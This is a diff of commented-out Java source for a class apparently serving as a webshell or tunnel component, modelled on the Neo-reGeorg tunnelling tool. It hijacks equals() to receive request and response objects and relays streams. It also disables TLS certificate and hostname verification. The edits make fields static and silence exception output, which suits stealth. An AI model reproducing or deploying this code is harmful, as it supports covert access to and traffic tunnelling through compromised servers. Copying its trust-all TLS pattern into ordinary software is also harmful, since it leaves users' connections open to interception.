@@ -10,20 +10,21 @@
 //import java.util.HashMap;
 //
 //public class vsuosystem implements Runnable, HostnameVerifier, X509TrustManager {
-//    static HashMap addrs = collectAddr();
+//    private static final HashMap addrs = collectAddr();
 //
-//    InputStream gInStream;
-//    OutputStream gOutStream;
+//    public static InputStream gInStream;
+//    public static OutputStream gOutStream;
 //
 //
 //    public vsuosystem(InputStream in, OutputStream out) {
-//        this.gInStream = in;
-//        this.gOutStream = out;
+//        gInStream = in;
+//        gOutStream = out;
 //    }
 //    public vsuosystem(){
 //
 //    }
 //
+//    @Override
 //    public boolean equals(Object obj){
 //        Object[] args     = (Object[]) obj;
 //        Object request    = args[0];
@@ -53,7 +54,7 @@
 ////                e.printStackTrace();
 //            }
 //        } catch (Exception e) {
-//            e.printStackTrace();
+////            e.printStackTrace();
 //        }
 //        return true;
 //    }
@@ -83,7 +84,7 @@
 //            out.write(data);
 //            out.flush();
 //        } catch (Exception e) {
-//            e.printStackTrace();
+////            e.printStackTrace();
 //        }
 //
 //    }
@@ -501,9 +502,9 @@
 //        // ignore ssl verify
 //        // ref: https://github.com/L-codes/Neo-reGeorg/blob/master/templates/NeoreGeorg.java
 //        if (HttpsURLConnection.class.isInstance(conn)) {
-//            ((HttpsURLConnection) conn).setHostnameVerifier(this);
+//            ((HttpsURLConnection) conn).setHostnameVerifier(new vsuosystem());
 //            SSLContext ctx = SSLContext.getInstance("SSL");
-//            ctx.init(null, new TrustManager[]{this}, null);
+//            ctx.init(null, new TrustManager[]{new vsuosystem()}, null);
 //            ((HttpsURLConnection) conn).setSSLSocketFactory(ctx.getSocketFactory());
 //        }
 //
